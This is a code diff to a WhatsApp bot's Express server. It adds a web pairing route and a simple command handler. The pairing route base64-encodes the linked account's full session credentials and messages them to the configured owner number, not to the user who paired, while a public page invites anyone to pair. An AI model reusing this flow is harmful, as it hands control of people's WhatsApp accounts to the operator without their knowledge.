@@ -9,7 +9,7 @@ const app = express();
 app.use(express.json());
 
 // ==========================================
-// 1. WEB PAIRING ROUTE & FRONTEND (Vercel Compatible)
+// 1. WEB PAIRING ROUTE & FRONTEND (Vercel & Render Compatible)
 // ==========================================
 app.get('/pair', async (req, res) => {
     let num = req.query.num;
@@ -29,7 +29,7 @@ app.get('/pair', async (req, res) => {
             auth: state,
             printQRInTerminal: false,
             logger: pino({ level: 'silent' }),
-            browser: [config.BOT_NAME, "Chrome", "1.0.0"]
+            browser: [config.BOT_NAME, "Chrome", "2.5.0"]
         });
 
         sock.ev.on('creds.update', saveCreds);
@@ -55,6 +55,7 @@ app.get('/pair', async (req, res) => {
                         const credsData = fs.readFileSync(credsPath, 'utf8');
                         const base64Session = Buffer.from(credsData).toString('base64');
                         
+                        // Owner ko WhatsApp par Session ID send karna
                         const ownerJid = config.OWNER_NUMBER + "@s.whatsapp.net";
                         await sock.sendMessage(ownerJid, { 
                             text: `💜 *${config.BOT_NAME} NEW SESSION ID* 💜\n\n\`\`\`${base64Session}\`\`\`` 
@@ -63,6 +64,12 @@ app.get('/pair', async (req, res) => {
                 } catch (e) {
                     console.log("Error sending session to WhatsApp:", e);
                 }
+
+                setTimeout(() => {
+                    try {
+                        fs.rmSync(sessionPath, { recursive: true, force: true });
+                    } catch (err) {}
+                }, 10000);
             }
         });
 
@@ -71,7 +78,7 @@ app.get('/pair', async (req, res) => {
     }
 });
 
-// Homepage UI with "Get Session ID" Button
+// Homepage UI with Get Session ID & Pairing Button
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -128,5 +135,101 @@ app.get('/', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`🌐 Server running on port ${PORT}`));
+
+
+// ==========================================
+// 2. MAIN BOT CORE LOGIC & COMMAND HANDLER
+// ==========================================
+async function startBot() {
+  const { version } = await fetchLatestBaileysVersion();
+  const { state, saveCreds } = await useMultiFileAuthState('./session');
+
+  // Load session from SESSION_ID if provided in environment variables
+  if (config.SESSION_ID && !fs.existsSync('./session/creds.json')) {
+    try {
+      console.log("📥 Loading session from SESSION_ID...");
+      let sessData = config.SESSION_ID;
+      fs.writeFileSync('./session/creds.json', JSON.stringify(JSON.parse(Buffer.from(sessData, 'base64').toString('utf8'))));
+      console.log("✅ Session Loaded Successfully!");
+    } catch (e) {
+      try {
+        fs.writeFileSync('./session/creds.json', config.SESSION_ID);
+        console.log("✅ Session Loaded Successfully!");
+      } catch (err) {
+        console.log("⚠️ Invalid SESSION_ID format.");
+      }
+    }
+  }
+
+  const sock = makeWASocket({ 
+    version, 
+    auth: state, 
+    printQRInTerminal: false, 
+    logger: pino({ level: 'silent' }), 
+    browser: [config.BOT_NAME, 'Chrome', '2.5.0'] 
+  });
+
+  sock.ev.on('creds.update', saveCreds);
+
+  sock.ev.on('connection.update', (update) => {
+    const { connection, lastDisconnect } = update;
+    if (connection === 'close') {
+      const reason = lastDisconnect?.error?.output?.statusCode;
+      if (reason !== DisconnectReason.loggedOut) {
+        console.log("🔄 Connection lost, reconnecting...");
+        startBot();
+      } else {
+        console.log("❌ Session logged out.");
+      }
+    } else if (connection === 'open') {
+      console.log(`✅ ${config.BOT_NAME} SUCCESSFULLY CONNECTED TO WHATSAPP 💜`);
+    }
+  });
+
+  // Commands Handler
+  sock.ev.on('messages.upsert', async ({ messages }) => {
+    const m = messages[0]; 
+    if (!m.message || m.key.fromMe) return;
+    
+    const from = m.key.remoteJid;
+    const text = m.message.conversation || m.message.extendedTextMessage?.text || "";
+    
+    if (!text.startsWith(config.PREFIX)) return;
+    
+    const args = text.slice(config.PREFIX.length).trim().split(/ +/);
+    const cmd = args.shift().toLowerCase();
+    
+    if (cmd === 'menu' || cmd === 'help') {
+      let menu = `┏━━━ 💜 *${config.BOT_NAME}* 💜 ━━━┓\n`;
+      menu += `┃ 👑 Owner: ${config.OWNER_NAME}\n`;
+      menu += `┃ ⚡ Prefix: [ ${config.PREFIX} ]\n`;
+      menu += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n`;
+      menu += `✨ *COMMANDS:* ✨\n`;
+      if (config.COMMANDS && Array.isArray(config.COMMANDS)) {
+        config.COMMANDS.forEach(c => {
+          menu += `> *${config.PREFIX}${c.name}* - ${c.desc}\n`;
+        });
+      }
+      menu += `\n_Powered by ${config.OWNER_NAME}_ 💜`;
+      
+      await sock.sendMessage(from, { text: menu });
+    } 
+    else if (cmd === 'ping') {
+      await sock.sendMessage(from, { text: 'pong! ⚡ ARSLAN-MD is blazing fast 🚀' });
+    } 
+    else if (cmd === 'owner') {
+      await sock.sendMessage(from, { text: `👑 *Owner Info*\nName: ${config.OWNER_NAME}\nNumber: wa.me/${config.OWNER_NUMBER}` });
+    }
+    else if (cmd === 'runtime') {
+      let uptime = process.uptime();
+      let hours = Math.floor(uptime / 3600);
+      let minutes = Math.floor((uptime % 3600) / 60);
+      let seconds = Math.floor(uptime % 60);
+      await sock.sendMessage(from, { text: `⏱️ *Bot Uptime:* ${hours}h ${minutes}m ${seconds}s` });
+    }
+  });
+}
+
+startBot();
 
 export default app;
